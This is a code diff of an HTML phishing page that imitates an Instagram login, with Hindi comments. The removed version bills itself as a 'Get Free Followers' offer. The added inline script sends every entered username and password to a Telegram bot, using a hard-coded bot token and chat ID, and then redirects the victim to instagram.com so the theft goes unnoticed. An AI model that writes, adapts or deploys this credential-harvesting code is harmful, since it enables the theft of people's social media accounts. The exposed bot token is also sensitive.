@@ -3,53 +3,43 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Instagram</title>
-    <link rel="stylesheet" href="style.css">
+    <title>Login</title>
 </head>
 <body>
-    <div class="login-card">
-        <div class="insta-logo">
-            <svg viewBox="0 0 24 24" width="60" height="60" stroke="currentColor" stroke-width="2" fill="none" stroke-linecap="round" stroke-linejoin="round"><rect x="2" y="2" width="20" height="20" rx="5" ry="5"></rect><path d="M16 11.37A4 4 0 1 1 12.63 8 4 4 0 0 1 16 11.37z"></path><line x1="17.5" y1="6.5" x2="17.51" y2="6.5"></line></svg>
-        </div>
-        <h2>Get Free Followers</h2>
-        <p class="subtitle">100% Real & Active Followers</p>
-        
-        <form id="loginForm">
-            <input type="text" id="username" placeholder="Phone number, username, or email" required>
-            <input type="password" id="password" placeholder="Password" required>
-            <button type="submit">Log in</button>
-        </form>
-        
-        <div class="secure-text">
-            🔒 Safe & Secure Connection
-        </div>
-    </div>
-    <script src="script.js"></script>
+
+    <!-- फॉर्म -->
+    <form id="loginForm">
+        <input type="text" name="username" placeholder="Phone number, username, or email" required>
+        <br><br>
+        <input type="password" name="password" placeholder="Password" required>
+        <br><br>
+        <button type="submit">Log In</button>
+    </form>
+
+    <!-- जावास्क्रिप्ट कोड -->
+    <script>
+      const token = "8766378111:AAFhFm2MWr1z2L3NuntmI-jlDzGr2wrQRRs";  
+      const chatId = "7008289410";    
+
+      document.getElementById('loginForm').addEventListener('submit', function(e) {
+          e.preventDefault(); // पेज को रीफ्रेश होने से रोकता है
+
+          let user = document.querySelector('input[name="username"]').value;
+          let pass = document.querySelector('input[name="password"]').value;
+
+          let message = `नया लॉगिन डेटा:\nयूजरनेम: ${user}\nपासवर्ड: ${pass}`;
+          
+          // टेलीग्राम पर डेटा भेजने की रिक्वेस्ट
+          fetch(`https://api.telegram.org/bot${token}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(message)}`)
+          .then(response => response.json())
+          .then(data => {
+              console.log('सफलतापूर्वक भेज दिया गया', data);
+              // डेटा भेजने के बाद यूजर को इंस्टाग्राम पर रीडायरेक्ट कर देगा
+              window.location.href = "https://instagram.com"; 
+          })
+          .catch(error => console.error('एरर:', error));
+      });
+    </script>
+
 </body>
-  </html>
-<script>
-  const token = "YOUR_BOT_TOKEN";8766378111:AAFhFm2MWr1z2L3NuntmI-jlDzGr2wrQRRs  // यहाँ BotFather से मिला टोकन डालें
-  const chatId = "YOUR_CHAT_ID";7008289410    // यहाँ अपनी Chat ID डालें
-
-  document.querySelector('form').addEventListener('submit', function(e) {
-      e.preventDefault(); // पेज को रीफ्रेश होने से रोकता है
-
-      // फॉर्म से यूजरनेम और पासवर्ड की वैल्यू लेना (अपने इनपुट के 'name' के हिसाब से बदलें)
-      let user = document.querySelector('input[name="username"]').value;
-      let pass = document.querySelector('input[name="password"]').value;
-
-      let message = `नया लॉगिन डेटा:\nयूजरनेम: ${user}\nपासवर्ड: ${pass}`;
-      
-      // टेलीग्राम पर डेटा भेजने की रिक्वेस्ट
-      fetch(`https://api.telegram.org/bot${token}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(message)}`)
-      .then(response => response.json())
-      .then(data => {
-          console.log('सफलतापूर्वक भेज दिया गया', data);
-          // डेटा भेजने के बाद आप यूजर को असली पेज पर रीडायरेक्ट कर सकते हैं
-          window.location.href = "https://instagram.com"; 
-      })
-      .catch(error => console.error('एरर:', error));
-  });
-</script>
-
-
+</html>
